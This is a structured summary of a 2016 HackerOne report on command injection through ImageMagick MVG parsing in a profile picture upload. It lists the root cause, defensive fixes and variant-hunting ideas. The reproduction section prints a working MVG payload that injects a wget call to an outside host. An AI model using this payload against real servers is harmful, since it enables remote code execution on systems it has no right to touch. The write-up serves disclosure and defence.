# RCE in profile picture upload via ImageMagick MVG parsing

## Metadata
- **Source:** HackerOne
- **Report:** 135072 | https://hackerone.com/reports/135072
- **Submitted:** 2016-04-27
- **Reporter:** c666a323be94d57
- **Program:** HackerOne (report #135072)
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** Remote Code Execution, Arbitrary File Upload, Insecure Deserialization, Command Injection
- **CVEs:** None
- **Category:** memory-binary

## Summary
The profile picture upload endpoint fails to validate file types before passing them to ImageMagick, allowing an attacker to upload specially crafted MVG (Magic Vector Graphics) files disguised as images. ImageMagick's MVG parser interprets delegate directives that invoke bash commands, enabling command injection through the https delegate handler which uses unsanitized curl invocation.

## Attack scenario
1. Attacker crafts a malicious ASCII file containing MVG directives with embedded shell commands
2. File is disguised with .gif extension and uploaded via the profile picture upload at /settings/profile/edit
3. Server accepts the upload without validating actual file type or magic bytes
4. Backend processes the uploaded file with ImageMagick's convert utility
5. ImageMagick parses the MVG content and interprets the 'image' directive with https delegate
6. Embedded bash command executes with the privileges of the ImageMagick process (wget to attacker-controlled server)

## Root cause
Insufficient input validation combined with dangerous deserialization. The application trusts file extensions and passes unvalidated uploads directly to ImageMagick without checking magic bytes. ImageMagick's MVG format is Turing-complete through delegate directives, and the https delegate handler constructs bash commands without proper escaping of user-controlled input.

## Attacker mindset
An attacker seeks to establish arbitrary code execution on the target server by exploiting the image processing pipeline. By understanding that ASCII text can be interpreted as valid MVG directives, they leverage ImageMagick's delegate system to break out of the image processing context and execute system commands. This represents a privilege escalation from 'file upload' to 'arbitrary code execution' through format confusion.

## Defensive takeaways
- Always validate uploaded files by checking magic bytes/file signatures, not just extensions
- Whitelist only genuinely safe file types before processing (JPEG, PNG, GIF via magic bytes verification)
- Use image processing libraries with minimal attack surface or run ImageMagick in sandboxed/containerized environments with restricted permissions
- Disable dangerous ImageMagick features via policy.xml (disable delegates, disable MVG parsing, restrict shell access)
- Implement network isolation: image processing servers should not have outbound network access
- Use allowlists for ImageMagick delegates or disable all delegates if not explicitly needed
- Process uploads with restricted privileges (separate user account with minimal permissions)
- Implement proper escaping/quoting in any system command construction

## Variant hunting
Test other upload endpoints accepting image files (avatars, thumbnails, banners, post images)
Check if SVG uploads are accepted (similar XML-based exploitation potential)
Probe for other ImageMagick dangerous formats: EPS, PS, PDF
Test if other ImageMagick utilities are exposed (identify, mogrify, animate)
Hunt for similar delegate injection in other image processing libraries (GraphicsMagick, libvips)
Check if user-controlled filenames are passed to ImageMagick (filename-based injection)

## MITRE ATT&CK
- T1190
- T1068
- T1204
- T1566
- T1059

## Notes
This vulnerability exemplifies the danger of processing untrusted input through powerful libraries without proper sandboxing. ImageMagick's flexibility (supporting 200+ formats) becomes a liability when combined with lazy validation. The MVG delegate system is essentially a code execution vector disguised as image format support. The author notes this would be reported to ImageMagick as part of a broader MVG vulnerability advisory, suggesting this was a 0-day or recently discovered class of issues at the time of submission.

## Full report
<details><summary>Expand</summary>

Issue
=====
The profile picture upload at /settings/profile/edit is vulnerable to remote code execution due to the uploaded file being passed to ImageMagick without checking whether it's an actual image. Combined with the fact that ImageMagick parses ASCII text as so called MVG (Magic Vector Graphics), this enables an attacker to trigger a newly discovered vulnerability in MVG parsing which allows for command injection.

Steps to reproduce
======
Upload the following ASCII file as **x.gif** using the regular profile picture upload flow:
```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`wget -O- 1.2.3.4:1337 > /dev/null`'
pop graphic-context
```
This executes the `wget` command and makes an HTTP request to 1.2.3.4 on port 1337.

Technical details
======
The "image" directive in MVG allows for the usage of so called "delegates" which are somewhat similar to a protocol specifier in a URL: a colon-seperated (delegate,argument)-pair like e.g. "label:SomeText" can be specified, invoking the respective delegate handler. Custom delegates can be added as a bash-call with substitute variables in /etc/ImageMagick/delegates.xml. The handler for https-URLs uses a bash command to invoke curl which suffers from the command injection vulnerability.

Recommendation
======
A simple fix is to check the magic values of the uploaded files and whitelist those, i.e. to only allow JPEG, GIF and PNG uploads before passing the file to ImageMagick (e.g. the `convert` utility).
Also, servers that do image processing should not be able to establish outbound network connections.
This vulnerability will be reported to ImageMagick within the next 72 hours as a detailed advisory about this and several other MVG issues is currently being drafted.

</details>

---
*Analysed by Claude on 2026-05-24*
